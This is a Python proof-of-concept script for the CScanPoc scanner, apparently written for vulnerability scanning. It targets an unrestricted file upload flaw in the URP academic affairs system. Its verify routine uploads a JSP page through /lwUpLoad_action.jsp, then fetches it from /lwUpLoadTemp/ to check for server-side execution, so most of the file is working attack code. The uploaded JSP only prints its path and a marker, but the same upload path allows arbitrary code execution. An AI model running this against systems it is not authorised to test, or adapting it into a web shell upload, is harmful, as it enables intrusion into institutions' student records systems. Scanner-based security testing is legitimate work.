# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import hashlib

class Vuln(ABVuln):
    vuln_id = 'URP_0000' # 平台漏洞编号，留空
    name = 'URP综合教务系统 /lwUpLoad_action.jsp 任意文件上传漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_UPLOAD # 漏洞类型
    disclosure_date = '2014-12-08'  # 漏洞公布时间
    desc = '''
        http://xxx.xxx.xxx.xxx/lwUpLoad_action.jsp
        post:
            type="file" name="theFile" id="File"
            type="text" name="xh" id="context"
        可上传文件,未限制上传文件类型,导致任意文件上传漏洞。
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=075251' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'URP综合教务系统'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '01ee33db-f53b-41b0-8d7b-b6bbba87c165'
    author = '国光'  # POC编写者
    create_date = '2018-05-10' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/lwUpLoadTemp/null.jsp" 
            verify_url = '{target}'.format(target=self.target)+payload
            target_url = '{target}'.format(target=self.target)+"/lwUpLoad_action.jsp"
            file_v_jsp = '''<%@ page import="java.util.*,java.io.*" %>
                <%@ page import="java.io.*"%>
                <%
                String path=application.getRealPath(request.getRequestURI());
                File d=new File(path);
                out.println(path);
                %>
                <% out.println("payload=true");%>
            '''
            files = {'theFile': ('v.jsp', file_v_jsp, 'text/plain')}
            response = requests.post(target_url, files=files) # 上传

            response = requests.get(verify_url) # 验证
            content = response.content
            if 'payload=true' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))


    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()